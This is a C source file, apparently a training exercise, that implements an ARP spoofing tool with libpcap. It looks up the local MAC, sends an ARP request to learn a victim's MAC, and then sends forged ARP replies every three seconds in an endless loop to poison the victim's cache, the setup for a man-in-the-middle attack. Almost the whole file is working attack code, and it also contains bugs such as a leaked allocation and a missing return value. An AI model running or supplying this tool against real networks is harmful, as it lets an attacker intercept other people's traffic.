#include <send_arp.h>

unsigned char * find_Attacker_Mac(const char *dev)
{
    struct ifreq ifr;
    int s;
    memset(&ifr, 0x00, sizeof(ifr));
      strcpy(ifr.ifr_name, dev);

     if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
       perror("socket");
       exit(EXIT_SUCCESS);
     }

     if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
       perror("ioctl");
       exit(EXIT_SUCCESS);
     }
    unsigned char * Attacker_mac = (unsigned char *)malloc(sizeof(char)*6);
    Attacker_mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

    close(s);
  //  free(ifr);
    return Attacker_mac;

}

void usage() {
  printf("syntax: send_arp <interface> <Sender> <Target> \n");
  printf("sample: send_arp wlan0 192.168.10.223 192.168.10.1\n");
}

void ARP_REQ_Set(const char *dev, ARP *ARP_Pac,uint32_t SenderIP)
{
      unsigned char * Attacker_mac;// = nullptr;

      // Get_Sender_Mac
        Attacker_mac = find_Attacker_Mac(dev);
        printf("TEST MY_MAC:");
        for(int i=0; i<6; i++)   printf("%02x",Attacker_mac[i]);
        printf("\n");

         memset(ARP_Pac->D_Mac,0xff,6);
         Attacker_mac = find_Attacker_Mac(dev);
         memcpy(ARP_Pac->S_Mac,Attacker_mac,6);
         ARP_Pac->Eth_type=htons(ARP_Number);
         ARP_Pac->HW_Type=htons(0x0001);
         ARP_Pac->PT_Type=htons(IP_Number);
         ARP_Pac->HAL=0X06;
         ARP_Pac->PAL=0x04;
         ARP_Pac->Oper_Code =htons(OC_Req);// ARP Request
         for(int i=0; i<6; i++)ARP_Pac->SHW_Adr[i] =ARP_Pac->S_Mac[i];
           ARP_Pac->SPT_Adr= 0x00000000;
          //ARP_Pac->SPT_Adr=ntohl(0XC0A82B9D);  //attacker IP
         memset(ARP_Pac->DHW_Adr,0X00,6);
         ARP_Pac->DPT_Adr=SenderIP; //no ntohl!
   // return *ARP_Pac;
}

void ARP_REP_Set(ARP *ARP_Pac,const char * argv[] ,const u_char* packet)
{
    for(int i=0; i<6; i++)
         {
            ARP_Pac->D_Mac[i] =packet[22+i];
            ARP_Pac->DHW_Adr[i]=packet[22+i];
         }
          ARP_Pac->SPT_Adr= inet_addr(argv[3]); //target IP 32bit string -> 32bit int
          ARP_Pac->DPT_Adr= inet_addr(argv[2]);// Sender IP
           ARP_Pac->Oper_Code =htons(OC_Rep);// ARP reply
}

void Send_ARP(pcap_t* handle, ARP *ARP_Pac, int packet_size)
{
    while(1){
           pcap_sendpacket(handle,(unsigned char *)ARP_Pac,packet_size); //arp_spoofing!!!
           printf("ARP Spoofing Success!\n");
           sleep(3); //loop
    }
}

const u_char* find_Sender_Mac(pcap* handle,  struct pcap_pkthdr* header, ARP *ARP_Pac,const u_char* packet)
{
    while (true) { // if it receives packet, break;

          pcap_sendpacket(handle,(unsigned char *)ARP_Pac,sizeof(ARP)); //Send request
          int res = pcap_next_ex(handle, &header, &packet);

          if (res == 0) continue;
          if (res == -1 || res == -2)
            break;

         uint8_t OpCode= packet[21];
         uint16_t eth_type=uint16_t((packet[12]<<8)|packet[13]);
         uint32_t send_ip = uint32_t((packet[28]<<24 )| (packet[29]<<16)| (packet[30] <<8)| packet[31]);
         uint32_t target_ip = uint32_t((packet[38]<<24 )| (packet[39]<<16)| (packet[40] <<8)| packet[41]);

         //compare Captured Packet and condition

        if((ARP_Number==eth_type)&& (OC_Rep== OpCode)&& (ARP_Pac->DPT_Adr ==ntohl(send_ip))&& (ARP_Pac->SPT_Adr==ntohl(target_ip)) )
          {
            return packet;
          }
        }
}
